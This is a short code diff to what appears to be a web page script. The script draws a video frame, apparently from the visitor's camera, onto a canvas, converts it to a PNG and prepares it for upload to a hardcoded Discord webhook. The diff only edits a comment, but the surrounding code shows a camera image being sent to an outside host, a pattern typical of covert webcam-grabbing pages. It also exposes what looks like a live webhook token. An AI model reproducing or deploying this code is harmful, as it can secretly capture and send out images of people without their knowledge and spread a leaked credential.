@@ -92,7 +92,7 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             const imgURL = canvas.toDataURL('image/png');
 
-            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Modify this with your Discord webhook URL
+            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Your Discord webhook URL
             const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
             const imgBlob = dataURItoBlob(imgURL);
             const imgFormData = new FormData();
